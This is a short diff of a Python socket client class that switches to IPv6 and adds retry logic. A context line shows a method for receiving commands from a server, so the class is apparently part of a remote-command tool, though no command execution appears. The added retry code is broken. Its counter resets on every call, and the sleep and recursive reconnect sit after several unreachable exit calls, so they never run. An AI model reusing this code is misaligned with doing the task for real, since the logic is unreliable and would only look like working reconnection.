@@ -33,18 +33,23 @@ class Client:
 
     # will create the socket
     def open_socket(self):
+        tryy = 0
         try:
             self.s = socket(AF_INET6, SOCK_STREAM)
-            self.s.connect((self.host, self.port))
+            self.s.connect((self.host, self.port, 0, 0))
 
         except:
             print ("Failed open socket")
-            self.s.close()
-            sys.exit(0)
-            os._exit(0)
-            exit(0)
-            quit(0)
-            self.s.close()
+            tryy += 1
+            if tryy > 5:
+                self.s.close()
+                sys.exit(0)
+                os._exit(0)
+                exit(0)
+                quit(0)
+                self.s.close()
+                time.sleep(3)
+                self.open_socket()
 
     # receive commands from the Server
     def receive_commands(self):
